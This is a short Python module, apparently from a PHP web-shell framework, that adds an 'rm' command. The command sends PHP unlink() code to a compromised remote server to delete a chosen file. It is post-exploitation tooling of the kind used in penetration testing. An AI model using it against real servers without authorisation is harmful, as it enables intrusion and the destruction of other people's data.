from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core import modules

class Rm(Module):

    """Remove remote file."""

    aliases = [ 'rm' ]

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : 'rpath', 'help' : 'Remote file path' }
        ])

    def run(self):

        # Run unlink
        return PhpCode("""(unlink('${rpath}') && print(1)) || print(0);""",
                        postprocess = lambda x: True if x == '1' else False
                        ).run(self.args)
